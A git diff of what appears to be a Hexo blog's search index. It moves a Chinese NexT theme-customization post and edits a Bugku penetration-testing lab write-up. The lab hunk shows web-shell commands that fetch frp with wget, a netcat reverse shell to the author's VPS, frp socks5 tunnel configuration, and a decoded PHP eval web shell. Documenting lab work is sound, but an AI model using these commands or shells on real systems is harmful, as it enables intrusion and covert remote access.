-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//文章内容的透明度设置</span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//侧边框的透明度设置</span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: transparent;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//菜单栏的透明度设置</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="隐藏网页底部-powered-By"><a href="#隐藏网页底部-powered-By" class="headerlink" title="隐藏网页底部 powered By"></a>隐藏网页底部 powered By</h1><p>打开 <code>themes/next/layout/_partials/footer.swig</code></p>
-<p>找到下面的代码，应该在最底下，用 <code>&lt;!--   --&gt;</code>注释掉</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">&#123;%- <span class="keyword">if</span> theme.footer.powered %&#125;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">powered</span>-<span class="title">by</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    </span>&#123;%- set next_site = <span class="string">&#x27;https://theme-next.org&#x27;</span> %&#125;</span><br><span class="line">    &#123;%- <span class="keyword">if</span> theme.scheme !== <span class="string">&#x27;Gemini&#x27;</span> %&#125;</span><br><span class="line">      &#123;%- set next_site = <span class="string">&#x27;https://&#x27;</span> + theme.scheme | lower + <span class="string">&#x27;.theme-next.org&#x27;</span> %&#125;</span><br><span class="line">    &#123;%- <span class="keyword">endif</span> %&#125;</span><br><span class="line">    &#123;&#123;- <span class="title function_ invoke__">__</span>(<span class="string">&#x27;footer.powered&#x27;</span>, <span class="title function_ invoke__">next_url</span>(<span class="string">&#x27;https://hexo.io&#x27;</span>, <span class="string">&#x27;Hexo&#x27;</span>, &#123;<span class="attr">class</span>: <span class="string">&#x27;theme-link&#x27;</span>&#125;) + <span class="string">&#x27; &amp; &#x27;</span> + <span class="title function_ invoke__">next_url</span>(next_site, <span class="string">&#x27;NexT.&#x27;</span> + theme.scheme, &#123;<span class="attr">class</span>: <span class="string">&#x27;theme-link&#x27;</span>&#125;)) &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;%- <span class="keyword">endif</span> %&#125;</span><br><span class="line"></span><br><span class="line">&#123;%- <span class="keyword">if</span> theme.add_this_id %&#125;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">addthis_inline_share_toolbox</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;//<span class="title">s7</span>.<span class="title">addthis</span>.<span class="title">com</span>/<span class="title">js</span>/300/<span class="title">addthis_widget</span>.<span class="title">js</span>#<span class="title">pubid</span>=</span>&#123;&#123; theme.add_this_id &#125;&#125;<span class="string">&quot; async=&quot;</span>async<span class="string">&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#123;%- endif %&#125;</span></span><br><span class="line"><span class="string">--&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="设置图标"><a href="#设置图标" class="headerlink" title="设置图标"></a>设置图标</h1><h2 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h2><p>网站的默认图标是 NexT 的图标，我们可以自行修改</p>
-<p>首先要找一张 ico 图标，可以自己制作或者别的网站去找，我是在<a href="https://www.logosc.cn/logo/monogram">这里</a>找的，它可以自动生成符合的 ico 图标格式</p>
-<p>把图标放在 <code>/themes/next/source/images</code>里面，打开 _config.yml 配置文件，找到下面语句，将后面的图片修改为你想要改的图片</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/favicon-16x16-next.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/favicon-32x32-next.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/apple-touch-icon-next.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.svg</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="标签图标"><a href="#标签图标" class="headerlink" title="标签图标"></a>标签图标</h2><p>我们界面底下标签的前面 是一个 # 号，我们也可以将其修改为图标</p>
-<p>找到模板<code>/themes/next/layout/_macro/post.swig</code>，在里面找到 242 行</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=&quot;&#123;&#123; url_for(tag<span class="selector-class">.path</span>) &#125;&#125;&quot; rel=&quot;tag&quot;&gt;&#123;&#123; tag_indicate &#125;&#125; &#123;&#123; tag<span class="selector-class">.name</span> &#125;&#125;&lt;/<span class="selector-tag">a</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<p>修改为</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=&quot;&#123;&#123; url_for(tag<span class="selector-class">.path</span>) &#125;&#125;&quot; rel=&quot;tag&quot;&gt;&lt;<span class="selector-tag">i</span> class=&quot;fa fa-tag&quot;&gt;&#123;&#123; tag<span class="selector-class">.name</span> &#125;&#125;&lt;/<span class="selector-tag">i</span>&gt;&lt;/<span class="selector-tag">a</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="增加字数统计和阅读时长功能"><a href="#增加字数统计和阅读时长功能" class="headerlink" title="增加字数统计和阅读时长功能"></a>增加字数统计和阅读时长功能</h1>]]></content>
-      <categories>
-        <category>setting</category>
-      </categories>
-      <tags>
-        <tag>NexT</tag>
-        <tag>setting</tag>
       </tags>
   </entry>
   <entry>
@@ -637,6 +565,78 @@
       <tags>
         <tag>php</tag>
         <tag>phar</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NexT 主题设置</title>
+    <url>/post/ac8b041d.html</url>
+    <content><![CDATA[<p>好不容易弄好了图片问题，就想着去美化一下主题，起码现在的功能太少了</p>
+<span id="more"></span>
+
+<h1 id="添加菜单"><a href="#添加菜单" class="headerlink" title="添加菜单"></a>添加菜单</h1><p>进入 NexT 的  <code>_config.yml</code> 文件，搜索 menu (119行) 可以看到几个菜单</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span>    <span class="comment">#首页</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">user</span>  <span class="comment">#关于</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">tags</span>  <span class="comment">#标签</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span>  <span class="comment">#分类</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span>  <span class="comment">#归档</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">/schedule/</span> <span class="string">||</span> <span class="string">calendar</span>  <span class="comment">#日程表</span></span><br><span class="line">  <span class="attr">sitemap:</span> <span class="string">/sitemap.xml</span> <span class="string">||</span> <span class="string">sitemap</span>  <span class="comment">#站点地图</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">heartbeat</span>  <span class="comment">#公益 404</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以根据自己的需要来选择，只需要把前面的注释删掉就行了</p>
+<p>但是我们只是有了这几个菜单，我们还应该为他们创建页面，运行下面的相关命令即可，你需要什么菜单就创建什么界面</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>新建 page 后，会在 source 目录下新建 <code>about</code>、<code>tags</code>、<code>categories</code>文件夹，每个文件夹下还会创建一个<code>index.md</code>文件表示关于、标签页分类页面，编辑这三个MarkDown文件可以自定义这三个页面的内容.</p>
+<p>最后一步，编辑各页面对应的<code>index.md</code>文件，增加 type 即可。注意冒号 : 后必须空一格，title 和 date 是默认生成的。重新部署后能够看到效果。</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /source/about/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">about</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"> <span class="comment"># /source/tags/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"> <span class="comment"># /source/categories/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
+
+<p>在新建博文的头部，直接输入该博文的分类、标签等即可。分类只能有一个，标签能有多个，多个标签不能一行，注意下面的格式。</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hello</span> <span class="string">World</span> <span class="comment"># 标题</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="string">/3/26</span> <span class="string">hh:mm:ss</span> <span class="comment"># 时间</span></span><br><span class="line"><span class="attr">categories:</span> <span class="comment"># 分类</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">分类</span>  <span class="comment"># 只能由一个</span></span><br><span class="line"><span class="attr">tags:</span> <span class="comment"># 标签</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">PS3</span>  <span class="comment"># 能有多个</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">Games</span>  <span class="comment"># 一个标签一行</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">正文</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="设置菜单位置"><a href="#设置菜单位置" class="headerlink" title="设置菜单位置"></a>设置菜单位置</h1><p>搜索 <code>Scheme </code>可以看到四个选项，这个是用来设置菜单的位置的</p>
+<p>这些描述是看不出来结构的，只有自己一个个试了才知道心仪哪个</p>
+<p>想用哪个就取消注释即可，但是要把另外三个注释掉</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment">#scheme: Muse  #这是默认的样式，黑白主调，大量留白；</span></span><br><span class="line"><span class="comment">#scheme: Mist  #Muse 的紧凑版本，整洁有序的单栏外观；</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Pisces</span>  <span class="comment">#双栏 Scheme，小家碧玉似的清新；</span></span><br><span class="line"><span class="comment">#scheme: Gemini #左侧是网站信息及目录，块 + 片段结构布局</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="设置圆角"><a href="#设置圆角" class="headerlink" title="设置圆角"></a>设置圆角</h1><p>由于我是新版本，需要在 source 文件夹下面新建一个 <code>_data</code> 文件夹，这个 source 文件夹就是刚才上面设置菜单的那个文件夹，也就是说 _data 文件夹和 about，tags 等在同一目录下</p>
+<p>在 _data 文件夹里面新建 <code>variables.styl</code>,在这个里面添加下面的语句</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$<span class="attribute">border-radius</span>-inner     = <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span>;</span><br><span class="line">$<span class="attribute">border-radius</span>           = <span class="number">20px</span>;</span><br></pre></td></tr></table></figure>
+
+<p>同时打开 NexT 的配置文件 _config.yml，找到下面语句，去掉注释，这一句大概在 32 行</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="设置背景图片"><a href="#设置背景图片" class="headerlink" title="设置背景图片"></a>设置背景图片</h1><h2 id="更改图片背景"><a href="#更改图片背景" class="headerlink" title="更改图片背景"></a>更改图片背景</h2><p>还是在 _data 文件夹里面新建 <code>styles.styl</code></p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//背景图片设置</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">/images/R-C.jpg</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">    <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>background-image:url</code> 为图片路径，可以直接使用链接，也可以是图片路径（将自定义图片放入<code>themes/next/source/images</code>路径下）</li>
+<li><code>background-repeat</code>：若果背景图片不能全屏，那么是否平铺显示，充满屏幕</li>
+<li><code>background-attachment</code>：背景是否随着网页上下滚动而滚动，fixed 为固定</li>
+<li><code>background-size</code>：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示</li>
+</ul>
+<p>接下来打开 _config.yml ，找到这一行(34 行)，去除注释</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="页面透明化"><a href="#页面透明化" class="headerlink" title="页面透明化"></a>页面透明化</h2><p>为了更好的欣赏背景图片，可以将博客的界面透明化，在 styles.styl 里面添加下面的内容，也可以自己修改一些参数</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//文章内容的透明度设置</span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//侧边框的透明度设置</span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: transparent;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//菜单栏的透明度设置</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="隐藏网页底部-powered-By"><a href="#隐藏网页底部-powered-By" class="headerlink" title="隐藏网页底部 powered By"></a>隐藏网页底部 powered By</h1><p>打开 <code>themes/next/layout/_partials/footer.swig</code></p>
+<p>找到下面的代码，应该在最底下，用 <code>&lt;!--   --&gt;</code>注释掉</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">&#123;%- <span class="keyword">if</span> theme.footer.powered %&#125;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">powered</span>-<span class="title">by</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    </span>&#123;%- set next_site = <span class="string">&#x27;https://theme-next.org&#x27;</span> %&#125;</span><br><span class="line">    &#123;%- <span class="keyword">if</span> theme.scheme !== <span class="string">&#x27;Gemini&#x27;</span> %&#125;</span><br><span class="line">      &#123;%- set next_site = <span class="string">&#x27;https://&#x27;</span> + theme.scheme | lower + <span class="string">&#x27;.theme-next.org&#x27;</span> %&#125;</span><br><span class="line">    &#123;%- <span class="keyword">endif</span> %&#125;</span><br><span class="line">    &#123;&#123;- <span class="title function_ invoke__">__</span>(<span class="string">&#x27;footer.powered&#x27;</span>, <span class="title function_ invoke__">next_url</span>(<span class="string">&#x27;https://hexo.io&#x27;</span>, <span class="string">&#x27;Hexo&#x27;</span>, &#123;<span class="attr">class</span>: <span class="string">&#x27;theme-link&#x27;</span>&#125;) + <span class="string">&#x27; &amp; &#x27;</span> + <span class="title function_ invoke__">next_url</span>(next_site, <span class="string">&#x27;NexT.&#x27;</span> + theme.scheme, &#123;<span class="attr">class</span>: <span class="string">&#x27;theme-link&#x27;</span>&#125;)) &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;%- <span class="keyword">endif</span> %&#125;</span><br><span class="line"></span><br><span class="line">&#123;%- <span class="keyword">if</span> theme.add_this_id %&#125;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">addthis_inline_share_toolbox</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;//<span class="title">s7</span>.<span class="title">addthis</span>.<span class="title">com</span>/<span class="title">js</span>/300/<span class="title">addthis_widget</span>.<span class="title">js</span>#<span class="title">pubid</span>=</span>&#123;&#123; theme.add_this_id &#125;&#125;<span class="string">&quot; async=&quot;</span>async<span class="string">&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#123;%- endif %&#125;</span></span><br><span class="line"><span class="string">--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="设置图标"><a href="#设置图标" class="headerlink" title="设置图标"></a>设置图标</h1><h2 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h2><p>网站的默认图标是 NexT 的图标，我们可以自行修改</p>
+<p>首先要找一张 ico 图标，可以自己制作或者别的网站去找，我是在<a href="https://www.logosc.cn/logo/monogram">这里</a>找的，它可以自动生成符合的 ico 图标格式</p>
+<p>把图标放在 <code>/themes/next/source/images</code>里面，打开 _config.yml 配置文件，找到下面语句，将后面的图片修改为你想要改的图片</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/favicon-16x16-next.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/favicon-32x32-next.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/apple-touch-icon-next.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.svg</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="标签图标"><a href="#标签图标" class="headerlink" title="标签图标"></a>标签图标</h2><p>我们界面底下标签的前面 是一个 # 号，我们也可以将其修改为图标</p>
+<p>找到模板<code>/themes/next/layout/_macro/post.swig</code>，在里面找到 242 行</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=&quot;&#123;&#123; url_for(tag<span class="selector-class">.path</span>) &#125;&#125;&quot; rel=&quot;tag&quot;&gt;&#123;&#123; tag_indicate &#125;&#125; &#123;&#123; tag<span class="selector-class">.name</span> &#125;&#125;&lt;/<span class="selector-tag">a</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改为</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=&quot;&#123;&#123; url_for(tag<span class="selector-class">.path</span>) &#125;&#125;&quot; rel=&quot;tag&quot;&gt;&lt;<span class="selector-tag">i</span> class=&quot;fa fa-tag&quot;&gt;&#123;&#123; tag<span class="selector-class">.name</span> &#125;&#125;&lt;/<span class="selector-tag">i</span>&gt;&lt;/<span class="selector-tag">a</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="增加字数统计和阅读时长功能"><a href="#增加字数统计和阅读时长功能" class="headerlink" title="增加字数统计和阅读时长功能"></a>增加字数统计和阅读时长功能</h1>]]></content>
+      <categories>
+        <category>setting</category>
+      </categories>
+      <tags>
+        <tag>NexT</tag>
+        <tag>setting</tag>
       </tags>
   </entry>
   <entry>
@@ -1117,7 +1117,7 @@
 <p>这里找到了 nc，可以利用 nc 进行反弹 shell</p>
 <p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/17.png" alt="17"></p>
 <p>我们先利用 wegt 下载 frp 工具</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.10/shell.php/?cmd=wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz</span><br><span class="line">192.168.0.10/shell.php/?cmd=tar -zxvf frp_0.48.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.10/shell.php?cmd=wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz</span><br><span class="line">192.168.0.10/shell.php?cmd=tar -xvf frp_0.48.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>
 
 <p>自己的 VPS 监听端口 <code>nc -lvvp port</code></p>
 <p>同时访问：<code>192.168.0.10/shell.php?cmd=nc xx.xx.xx.xx port -e /bin/sh</code></p>
@@ -1125,17 +1125,17 @@
 <p>连接成功</p>
 <p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/18.png" alt="18"></p>
 <p>进入文件夹，利用 echo 修改 frpc.ini </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;[common]&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;server_addr = xx.xx.xx.xx&#x27; &gt;&gt; frpc.ini   你自己的 vps ip</span><br><span class="line">echo &#x27;server_port = 7000&#x27; &gt;&gt; frpc.ini</span><br><span class="line"></span><br><span class="line">echo &#x27;[lo80]&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;type = tcp&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;local_ip = 127.0.0.1&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;local_port = 80&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;remote_port = 16000&#x27; &gt;&gt; frpc.ini</span><br><span class="line"></span><br><span class="line">echo &#x27;[socks5]&#x27;&gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;type = tcp &#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;remote_port = 16005&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;plugin = socks5&#x27; &gt;&gt; frpc.ini</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;[common]&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;server_addr = 106.55.226.242&#x27; &gt;&gt; frpc.ini   你自己的 vps ip</span><br><span class="line">echo &#x27;server_port = 7000&#x27; &gt;&gt; frpc.ini</span><br><span class="line"></span><br><span class="line">echo &#x27;[socks5]&#x27;&gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;type = tcp &#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;remote_port = 7001&#x27; &gt;&gt; frpc.ini</span><br><span class="line">echo &#x27;plugin = socks5&#x27; &gt;&gt; frpc.ini</span><br></pre></td></tr></table></figure>
 
 <p>赋予权限</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chomod 777 frpc</span><br></pre></td></tr></table></figure>
 
 <p>启动</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini  vps 先启动</span><br><span class="line">./frpc -c ~/frp_0.48.0_linux_amd64/frpc.ini  靶机后启动,注意 -c 指的是 ini 文件的绝对路径</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./frps -c ~/frp_0.48.0_linux_amd64/frps.ini  vps 先启动</span><br><span class="line">./frpc -c /var/www/html/frp_0.48.0_linux_amd64/frpc.ini  靶机后启动,注意 -c 指的是 ini 文件的绝对路径</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/19.png" alt="19"></p>
 <p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/20.png" alt="20"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=echo &quot;PD9waHAgZXZhbCgkX1BPU1RbczFlbnRdKTs/Pg==&quot;|base64 -d&gt; s.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=echo &quot;PD9waHAgZXZhbCgkX1BPU1RbczFlbnRdKTs/Pg==&quot;|base64 -d&gt; s.php</span><br><span class="line">&lt;?php eval($_POST[s1ent]);?&gt;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <tags>
